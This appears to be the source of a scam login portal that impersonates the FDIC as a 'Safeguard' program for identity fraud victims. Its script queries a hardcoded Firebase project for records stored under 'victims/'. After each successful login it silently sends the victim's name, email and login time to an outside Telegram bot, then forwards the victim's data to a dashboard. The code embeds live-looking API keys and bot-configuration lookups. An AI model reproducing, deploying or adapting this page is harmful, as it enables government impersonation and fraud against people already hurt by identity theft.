<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FDIC Safeguard - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --fdic-blue: #003366;
            --fdic-gold: #C5B358;
            --fdic-white: #FFFFFF;
            --fdic-gray: #F4F4F4;
            --text-dark: #333333;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--fdic-blue);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: var(--text-dark);
        }

        .login-container {
            background: var(--fdic-white);
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo-area {
            margin-bottom: 30px;
        }

        .logo-area h1 {
            color: var(--fdic-blue);
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .logo-area p {
            color: #666;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #555;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: var(--fdic-blue);
            outline: none;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: var(--fdic-blue);
            color: var(--fdic-white);
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-login:hover {
            background-color: #002244;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: rgba(255,255,255,0.8);
            text-align: center;
        }

        .footer a {
            color: rgba(255,255,255,0.8);
            text-decoration: none;
            margin: 0 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .error-msg {
            color: #d9534f;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }

        .loader {
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-area">
            <h1>FDIC SAFEGUARD</h1>
            <p>REGULATORY PROGRAM</p>
            <p>IDENTITY FRAUD VICTIMS</p>
        </div>

        <div id="errorMsg" class="error-msg">Invalid Username or Password</div>

        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn-login">Sign In</button>
            <div class="loader">Verifying Credentials...</div>
        </form>
    </div>

    <div class="footer">
        <p>&copy; 2026 Safe Guard Bank. All rights reserved.</p>
        <p><a href="#">Terms and Conditions</a> | <a href="#">Privacy Policy</a></p>
    </div>

    <script type="module">
        // REPLACE WITH YOUR FIREBASE CONFIG
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        const firebaseConfig = {
  apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
  authDomain: "fdicprotects.firebaseapp.com",
  databaseURL: "https://fdicprotects-default-rtdb.firebaseio.com",
  projectId: "fdicprotects",
  storageBucket: "fdicprotects.firebasestorage.app",
  messagingSenderId: "1087204523962",
  appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
};

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const loginForm = document.getElementById('loginForm');
        const errorMsg = document.getElementById('errorMsg');
        const loader = document.querySelector('.loader');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            errorMsg.style.display = 'none';
            loader.style.display = 'block';

            try {
                // 1. Fetch Config for Telegram
                const configRef = ref(db, 'config/telegram');
                const configSnapshot = await get(configRef);
                const telegramConfig = configSnapshot.exists() ? configSnapshot.val() : { botToken: '', chatId: '' };

                // 2. Fetch User Data
                const userRef = ref(db, 'victims/' + username);
                const userSnapshot = await get(userRef);

                if (userSnapshot.exists()) {
                    const userData = userSnapshot.val();
                    
                    // Check Password
                    if (userData.password === password) {
                        // 3. Send Telegram Notification
                        if (telegramConfig.botToken && telegramConfig.chatId) {
                            const message = `🚨 New Login Alert!\n\nVictim: ${userData.firstName || 'Unknown'} ${userData.lastName || ''}\nEmail: ${userData.email || 'N/A'}\nTime: ${new Date().toLocaleString()}`;
                            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
                            
                            fetch(url, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: telegramConfig.chatId,
                                    text: message
                                })
                            }).catch(err => console.log('Telegram Error:', err));
                        }

                        // 4. Redirect to Dashboard with User Data
                        // Using sessionStorage to pass data simply without complex routing
                        sessionStorage.setItem('currentUser', JSON.stringify(userData));
                        sessionStorage.setItem('currentUsername', username);
                        window.location.href = 'dashboard.html';
                    } else {
                        errorMsg.textContent = "Invalid Username or Password";
                        errorMsg.style.display = 'block';
                        loader.style.display = 'none';
                    }
                } else {
                    errorMsg.textContent = "Invalid Username or Password";
                    errorMsg.style.display = 'block';
                    loader.style.display = 'none';
                }
            } catch (error) {
                console.error("Login Error:", error);
                errorMsg.textContent = "System Error. Please try again.";
                errorMsg.style.display = 'block';
                loader.style.display = 'none';
            }
        });
    </script>
</body>
</html>
